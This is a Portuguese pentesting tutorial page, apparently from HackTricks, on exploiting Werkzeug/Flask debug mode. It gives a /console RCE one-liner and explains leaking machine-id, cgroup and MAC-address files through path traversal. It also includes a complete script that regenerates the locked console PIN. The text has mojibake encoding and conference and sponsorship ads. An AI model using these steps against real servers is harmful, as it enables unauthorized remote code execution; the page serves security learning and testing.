# Werkzeug / Flask Debug

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference Ã© um evento internacional de ciberseguranÃ§a**](https://www.dragonjarcon.org/) com mais de uma dÃ©cada que serÃ¡ realizado nos dias 7 e 8 de setembro de 2023 em BogotÃ¡, ColÃ´mbia. Ã‰ um evento de alto conteÃºdo tÃ©cnico onde sÃ£o apresentadas as Ãºltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e nÃ£o perca esta grande conferÃªncia!:

{% embed url="https://www.dragonjarcon.org" %}

## Console RCE

Se o modo de depuraÃ§Ã£o estiver ativo, vocÃª pode tentar acessar `/console` e obter RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

TambÃ©m existem vÃ¡rias exploraÃ§Ãµes na internet como [esta](https://github.com/its-arun/Werkzeug-Debug-RCE) ou uma no metasploit.

## Protegido por PIN - Traversal de Caminho

Em algumas ocasiÃµes, o endpoint **`/console`** serÃ¡ protegido por um PIN. Se vocÃª tiver uma **vulnerabilidade de travessia de arquivo**, poderÃ¡ vazar todas as informaÃ§Ãµes necessÃ¡rias para gerar esse PIN.

### ExploraÃ§Ã£o de PIN do Werkzeug Console

**Copiado do primeiro link.**\
Veja a mensagem "console bloqueado" do Werkzeug forÃ§ando a pÃ¡gina de erro de depuraÃ§Ã£o no aplicativo.
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Localize a console de depuraÃ§Ã£o vulnerÃ¡vel do Werkzeug no caminho `vulnerable-site.com/console`, mas estÃ¡ bloqueada por um nÃºmero PIN secreto.

VocÃª pode reverter o algoritmo que gera o PIN do console. Inspecte o arquivo `__init__.py` de depuraÃ§Ã£o do Werkzeug no servidor, por exemplo, `python3.5/site-packages/werkzeug/debug/__init__.py`. VocÃª pode visualizar o [**repositÃ³rio de cÃ³digo-fonte do Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py) **para verificar como o PIN Ã© gerado**, mas Ã© melhor vazar o cÃ³digo-fonte por meio de uma **vulnerabilidade de travessia de arquivos**, jÃ¡ que as versÃµes provavelmente sÃ£o diferentes.

VariÃ¡veis necessÃ¡rias para explorar o PIN do console:
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** Ã© o usuÃ¡rio que iniciou este Flask
* **`modname`** Ã© flask.app
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` Ã© **Flask**
* `getattr(mod, '__file__', None)` Ã© o **caminho absoluto de `app.py`** no diretÃ³rio do flask (por exemplo, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` nÃ£o funcionar, **tente `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` Ã© o **endereÃ§o MAC do computador atual**, `str(uuid.getnode())` Ã© a expressÃ£o decimal do endereÃ§o MAC.

* Para **encontrar o endereÃ§o MAC do servidor**, Ã© necessÃ¡rio saber qual **interface de rede estÃ¡ sendo usada** para servir o aplicativo (por exemplo, `ens3`). Se desconhecido, **vaze `/proc/net/arp`** para obter o ID do dispositivo e, em seguida, **vaze** o endereÃ§o MAC em **`/sys/class/net/<device id>/address`**.

Converter **do endereÃ§o hex para a representaÃ§Ã£o decimal** executando em python, por exemplo:

```python
# Era 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` concatena os **valores em `/etc/machine-id`**, **`/proc/sys/kernel/random/boot_id`** e **primeira linha de `/proc/self/cgroup`** apÃ³s a Ãºltima barra (`/`).

<details>

<summary>CÃ³digo get_machine_id()</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Uma vez que todas as variÃ¡veis estiverem preparadas, execute o script de exploraÃ§Ã£o para gerar o PIN do console Werkzeug:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
Se vocÃª estiver em uma **versÃ£o antiga** do Werkzeug, tente alterar o **algoritmo de hash para md5** em vez de sha1.
{% endhint %}

## ReferÃªncias

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference Ã© um evento internacional de ciberseguranÃ§a**](https://www.dragonjarcon.org/) com mais de uma dÃ©cada que serÃ¡ realizado nos dias **7 e 8 de setembro de 2023** em BogotÃ¡, ColÃ´mbia. Ã‰ um evento de alto conteÃºdo tÃ©cnico onde sÃ£o apresentadas as Ãºltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e nÃ£o perca esta grande conferÃªncia!:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
